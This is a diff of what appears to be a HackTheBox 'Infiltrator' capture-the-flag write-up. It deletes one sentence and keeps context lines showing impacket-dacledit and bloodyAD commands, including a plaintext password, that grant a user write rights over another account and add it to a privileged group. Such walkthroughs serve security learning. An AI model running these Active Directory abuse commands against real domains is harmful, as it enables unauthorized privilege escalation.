@@ -23,8 +23,6 @@ Now, the "d.anderson" user will have full control of Marketing Digital OU.
 
 
 
-As, the next victim user which is on this OU, we can have full access over it too.
-
 ```
 └─# impacket-dacledit -action 'write' -principal 'D.anderson' -target-dn 'CN=E.RODRIGUEZ,OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb'/'D.anderson' -k -no-pass -dc-ip 10.10.11.31
 
@@ -36,8 +34,6 @@ bloodyAD.py -d infiltrator.htb -u d.anderson -k --host DC01.infiltrator.htb set 
 bloodyAD.py -d infiltrator.htb -u e.rodriguez -p 'WAT?watismypass!' --host DC01.infiltrator.htb add groupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" "e.rodriguez"
 
 ```
-
-
 
 
 
